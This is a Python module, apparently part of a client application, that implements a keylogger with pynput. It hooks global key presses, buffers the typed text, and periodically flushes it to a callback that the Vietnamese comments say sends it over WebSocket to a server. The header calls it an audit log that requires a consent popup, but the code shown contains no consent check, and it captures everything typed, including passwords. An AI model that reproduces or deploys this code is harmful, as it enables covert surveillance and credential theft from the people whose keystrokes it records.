"""
===============================================================================
FILE: client-app/modules/keylogger.py
PURPOSE: Ghi nhật ký thao tác bàn phím (Input Audit Log) phục vụ kiểm toán hệ thống.
ARCHITECTURE ROLE:
  - Hardware Hooking Module (sử dụng `pynput`).
  - Thiết kế Buffer Thread-Safe gom dữ liệu định kỳ gửi về Server.
  - BẮT BUỘC trải qua User Consent Popup trước khi khởi tạo Hooking.
===============================================================================
"""

import logging
import threading
import time
from typing import Callable, Optional
from pynput import keyboard

logger = logging.getLogger("KeyloggerModule")


class KeyloggerService:
    """
    Class quản lý dịch vụ Hook Bàn phím và Buffer lưu trữ dữ liệu phím.
    """

    def __init__(self):
        self.is_logging: bool = False
        self._listener: Optional[keyboard.Listener] = None
        self._buffer: str = ""
        self._lock = threading.Lock() # Lock giúp đảm bảo an toàn đa luồng (Thread-Safety)
        self._flush_thread: Optional[threading.Thread] = None
        self._on_flush_callback: Optional[Callable[[str], None]] = None

    def start_logging(self, on_flush_callback: Callable[[str], None]):
        """
        Khởi chạy Dịch vụ Lắng nghe Bàn phím.
        
        Args:
            on_flush_callback: Hàm nhận chuỗi văn bản gõ phím để gửi về Gateway.
        """
        if self.is_logging:
            logger.warning("⚠️ Keylogger đã đang trong trạng thái hoạt động!")
            return

        self.is_logging = True
        self._on_flush_callback = on_flush_callback
        self._buffer = ""

        # 1. Bắt đầu Listener Hook từ pynput
        self._listener = keyboard.Listener(on_press=self._on_key_press)
        self._listener.start()

        # 2. Mở Thread ngầm định kỳ xả Buffer (Flush Buffer) mỗi 3 giây
        self._flush_thread = threading.Thread(target=self._periodic_flush_loop, daemon=True)
        self._flush_thread.start()

        logger.info("⌨️ [KEYLOGGER] Đã bật dịch vụ Ghi nhật ký bàn phím (Input Audit Log).")

    def stop_logging(self):
        """
        Dừng Dịch vụ Lắng nghe Bàn phím và xả sạch Buffer còn lại.
        """
        if not self.is_logging:
            return

        self.is_logging = False

        # Dừng Listener
        if self._listener:
            self._listener.stop()
            self._listener = None

        # Xả nốt dữ liệu còn sót lại trong Buffer
        self.flush_buffer()
        logger.info("🛑 [KEYLOGGER] Đã dừng dịch vụ Ghi nhật ký bàn phím.")

    def _on_key_press(self, key):
        """
        Callback xử lý mỗi khi có 1 phím được bấm down.
        """
        char_to_append = ""

        try:
            # Ký tự phím thường (a-z, 0-9, symbol)
            if hasattr(key, 'char') and key.char is not None:
                char_to_append = key.char
            else:
                # Phím chức năng đặc biệt
                if key == keyboard.Key.space:
                    char_to_append = " "
                elif key == keyboard.Key.enter:
                    char_to_append = "\n[ENTER]\n"
                elif key == keyboard.Key.backspace:
                    char_to_append = "[BACKSPACE]"
                elif key == keyboard.Key.tab:
                    char_to_append = "[TAB]"
                # Bỏ qua các phím điều khiển khác như Shift, Ctrl, Alt để tránh rác log
        except Exception:
            pass

        if char_to_append:
            with self._lock:
                self._buffer += char_to_append
                
                # Nếu buffer vượt quá 50 ký tự, xả ngay lập tức không cần đợi 3s
                if len(self._buffer) >= 50:
                    self._flush_buffer_unsafe()

    def _periodic_flush_loop(self):
        """
        Thread ngầm tự động xả Buffer mỗi 3 giây.
        """
        while self.is_logging:
            time.sleep(3.0)
            self.flush_buffer()

    def flush_buffer(self):
        """
        Thread-safe method để xả Buffer về Callback.
        """
        with self._lock:
            self._flush_buffer_unsafe()

    def _flush_buffer_unsafe(self):
        """
        Hàm xả Buffer nội bộ (Cần gọi trong khối with self._lock).
        """
        if self._buffer and self._on_flush_callback:
            data_to_send = self._buffer
            self._buffer = "" # Reset buffer về rỗng
            
            # Đẩy dữ liệu ra Callback gửi qua WebSocket
            try:
                self._on_flush_callback(data_to_send)
            except Exception as e:
                logger.error(f"❌ Lỗi gửi dữ liệu Keylogger qua callback: {str(e)}")


keylogger_service = KeyloggerService()